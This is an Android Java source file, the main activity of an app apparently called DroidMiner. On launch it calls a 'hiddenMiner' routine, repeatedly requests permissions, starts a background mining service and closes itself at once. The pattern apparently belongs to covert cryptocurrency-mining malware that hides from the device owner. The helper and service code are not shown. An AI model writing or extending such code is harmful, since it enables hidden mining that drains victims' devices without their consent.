package com.miner.droidminer;


import android.content.Intent;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;


import com.miner.droidminer.modules.Util;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Util.hiddenMiner(getApplicationContext());
        try {
            Util.requestWithout(this);
        } catch (Exception e) {
            Log.e("RequestPermissionError", e.getMessage());
        }
        startService(new Intent(this, DroidMinerService.class));
        finish();
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (grantResults.length == 0) {
            Util.requestWithout (this);
        } else {
            startService (new Intent (this, DroidMinerService.class));
            finish();
        }
    }
}
